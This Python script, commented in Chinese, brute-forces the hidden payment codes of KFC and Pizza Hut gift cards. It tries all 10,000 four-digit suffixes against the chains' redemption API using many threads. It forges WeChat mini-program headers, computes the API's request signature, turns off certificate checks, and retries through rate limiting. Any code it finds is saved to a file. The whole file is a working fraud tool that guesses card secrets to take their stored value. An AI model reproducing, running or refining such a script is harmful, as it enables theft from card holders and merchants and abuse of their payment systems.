"""
礼品卡 paymentCode 多线程枚举 (Python 版)
支持 KFC / 必胜客，通过 config.json 配置
用法: python kfc_enum.py
"""

import json
import hashlib
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import requests
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局变量
cfg = {}
found_flag = False
done_count = 0


def load_config():
    """读取配置文件"""
    global cfg
    try:
        with open('config.json', 'r', encoding='utf-8') as f:
            cfg = json.load(f)
    except FileNotFoundError:
        print("读取 config.json 失败: 文件不存在")
        print("请确保 config.json 与本程序在同一目录")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"解析 config.json 失败: {e}")
        sys.exit(1)

    # 默认值
    if cfg.get('threads', 0) == 0:
        cfg['threads'] = 20
    if cfg.get('maxRetry', 0) == 0:
        cfg['maxRetry'] = 5
    if cfg.get('retryWait', 0) == 0:
        cfg['retryWait'] = 3


def calc_kbsv(timestamp, body_json):
    """计算 kbsv 签名"""
    raw = f"{cfg['clientKey']}\t{cfg['clientSec']}\t{timestamp}\t{cfg['signPath']}\t\t{body_json}"
    return hashlib.md5(raw.encode()).hexdigest()


def try_one(suffix):
    """尝试一个卡密后缀，返回响应文本"""
    global found_flag

    payment_code = cfg['paymentPrefix'] + suffix
    timestamp = str(int(datetime.now().timestamp() * 1000))

    # 构建请求体
    body = {
        "token": cfg['token'],
        "cardSequence": cfg['cardSequence'],
        "paymentCode": payment_code,
        "encodeList": cfg.get('encodeList', []),
        "isFromCustomerClient": True,
        "secretKey": cfg['secretKey']
    }

    # OpenID 非空时才加入（必胜客不需要）
    if cfg.get('openId'):
        body['openId'] = cfg['openId']

    body_json = json.dumps(body, separators=(',', ':'))
    kbsv = calc_kbsv(timestamp, body_json)

    headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "X-Yumc-Route-Cell": "yumc4",
        "X-Yumc-Route-Channel": "weapp",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2541b17) XWEB/20005",
        "Cache-Control": "no-cache",
        "Rcsdcid": "rcsdcid",
        "Rcsav": "",
        "Wechat-Platform": "windows",
        "Wechat-Os-Version": "Windows 11 x64",
        "Wechat-Language": "zh_CN",
        "Wechat-Version": "4.1.11.23",
        "Wechat-Model": "microsoft",
        "Wechat-Pixelratio": "1",
        "Xweb_Xhr": "1",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "kbck": cfg['clientKey'],
        "kbcts": timestamp,
        "kbsv": kbsv
    }

    if cfg.get('referer'):
        headers['Referer'] = cfg['referer']
    if cfg.get('host'):
        headers['Host'] = cfg['host']

    try:
        resp = requests.post(
            cfg['fullUrl'],
            data=body_json,
            headers=headers,
            verify=False,
            timeout=15
        )
        return resp.text
    except Exception as e:
        return json.dumps({"errCode": -1, "errMsg": f"异常:{e}"})


def worker(suffix):
    """工作线程处理单个后缀"""
    global found_flag, done_count

    if found_flag:
        return None

    retry = 0
    while True:
        if found_flag:
            return None

        body = try_one(suffix)
        try:
            resp = json.loads(body)
        except json.JSONDecodeError:
            resp = {"errCode": -1, "errMsg": "JSON解析失败"}

        err_code = str(resp.get('errCode', ''))
        msg = resp.get('errMsg', '')
        payment_code = cfg['paymentPrefix'] + suffix
        tag = f"[重试{retry}次]" if retry > 0 else ""

        # 兑换成功：errCode=0 且有 data
        if err_code == "0" and resp.get('data') is not None:
            found_flag = True
            print(f"\n{'=' * 60}")
            print(f">>> ✅ 兑换成功!")
            print(f">>> 卡号: {cfg['cardSequence']}")
            print(f">>> 密码: {payment_code}")
            print(f">>> 响应: {body[:500]}")
            print(f"{'=' * 60}")

            # 保存结果
            with open('found_payment.txt', 'w', encoding='utf-8') as f:
                f.write(f"卡号(cardSequence): {cfg['cardSequence']}\n")
                f.write(f"密码(paymentCode):   {payment_code}\n")
                f.write(f"响应: {body}\n")
            return payment_code

        # 541 = 卡号或密码错误，跳过
        if "541" in err_code:
            print(f"[{payment_code}]{tag} {msg}")
            done_count += 1
            return None

        # 其他错误（拥堵、超时、errCode=0无data等）→ 重试
        reason = msg if msg else f"响应异常({body[:100]})"
        if retry < cfg['maxRetry']:
            print(f"[{payment_code}]{tag} {reason} -> 等待{cfg['retryWait']}s后重试")
            time.sleep(cfg['retryWait'])
            retry += 1
            continue

        # 达到最大重试次数
        print(f"[{payment_code}]{tag} {reason} -> 已达最大重试次数({cfg['maxRetry']})，跳过")
        done_count += 1
        return None


def main():
    global found_flag, done_count

    load_config()

    # 识别品牌
    brand = "未知"
    if cfg['secretKey'] == "kfc":
        brand = "肯德基 KFC"
    elif cfg['secretKey'] == "ph":
        brand = "必胜客 Pizza Hut"

    # 打印信息
    print("=" * 60)
    print(f"礼品卡 paymentCode 多线程枚举 [{brand}]")
    print("=" * 60)
    print(f"卡号(cardSequence): {cfg['cardSequence']}")
    print(f"密码前缀:           {cfg['paymentPrefix']}")
    print(f"枚举范围:           {cfg['paymentPrefix']}0000 ~ {cfg['paymentPrefix']}9999")
    print(f"接口地址:           {cfg['fullUrl']}")
    print(f"线程数:             {cfg['threads']}")
    print(f"最大重试:           {cfg['maxRetry']} 次")
    print(f"成功条件:           errCode = 0")
    print(f"{'=' * 60}\n")

    start_time = time.time()

    # 生成所有后缀
    suffixes = [f"{i:04d}" for i in range(10000)]

    # 多线程执行
    with ThreadPoolExecutor(max_workers=cfg['threads']) as executor:
        futures = {executor.submit(worker, suffix): suffix for suffix in suffixes}

        # 进度监控
        last_report = time.time()
        for future in as_completed(futures):
            if found_flag:
                # 取消剩余任务
                for f in futures:
                    f.cancel()
                break

            # 每5秒报告一次进度
            current_time = time.time()
            if current_time - last_report >= 5:
                elapsed = current_time - start_time
                rate = done_count / elapsed if elapsed > 0 else 0
                print(f"\n--- 进度: {done_count}/10000 | {rate:.0f}req/s | 已用{elapsed:.0f}s ---\n")
                last_report = current_time

    elapsed = time.time() - start_time
    print(f"\n{'=' * 60}")
    if found_flag:
        print(f"✅ 完成! 耗时 {elapsed:.0f}s")
        print("结果已保存到 found_payment.txt")
    else:
        print(f"❌ 未找到(errCode=0)，耗时 {elapsed:.0f}s")
    print("=" * 60)


if __name__ == '__main__':
    main()
